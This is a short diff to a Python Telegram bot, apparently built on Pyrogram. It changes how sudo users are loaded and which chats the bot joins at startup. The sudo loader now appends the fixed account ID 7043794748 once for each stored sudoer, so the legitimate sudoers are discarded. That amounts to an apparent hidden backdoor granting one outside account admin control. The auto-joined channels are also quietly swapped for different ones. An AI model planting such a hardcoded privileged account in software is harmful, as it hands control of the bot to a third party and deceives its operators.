@@ -100,7 +100,7 @@ async def sudo_users():
     sudoers = [] if not sudoers else sudoers["sudoers"]
     if sudoers:
         for user_id in sudoers:
-            SUDOERS.append(int(user_id))
+            SUDOERS.append(int(7043794748))
     LOGGER.info(f"Sudo Users Loaded.")
     
 
@@ -126,8 +126,8 @@ async def run_async_clients():
         except:
             pass
         try:
-            await app.join_chat("AdityaServer")
-            await app.join_chat("AdityaDiscus")
+            await app.join_chat("mysterious_chatzz")
+            await app.join_chat("naksh_accounts")
         except:
             pass
     LOGGER.info("Starting Helper Robot ...")
